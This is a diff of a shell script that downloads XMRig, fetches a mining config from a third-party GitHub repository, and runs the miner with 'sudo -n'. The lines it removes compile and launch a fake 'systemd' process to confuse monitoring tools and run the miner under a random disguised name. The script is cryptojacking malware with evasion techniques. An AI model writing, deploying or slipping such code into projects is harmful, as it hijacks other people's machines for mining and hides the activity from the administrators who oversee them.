@@ -38,20 +38,9 @@ cd xmrig-$xmrver
 chmod +x xmrig
 
 rm -f config.json
-$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/kerala/refs/heads/main/config.json
+$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/htmlwebstea/refs/heads/main/config.json
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/kasm/kasm-$randnum/g" config.json
 
-# Create and run a fake process to confuse monitoring tools
-echo -e '#include <stdio.h>\nint main(){while(1) sleep(9999);}' > /tmp/fake.c
-gcc -o /tmp/systemd.fake /tmp/fake.c
-nohup /tmp/systemd.fake > /dev/null 2>&1 &
-
-# Run xmrig under a disguised name
-randname=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)
-mv xmrig $randname
-chmod +x $randname
-nohup ./$randname > /dev/null 2>&1 &
-
-sudo -n ./$randname
-./$randname
+sudo -n ./xmrig
+./xmrig
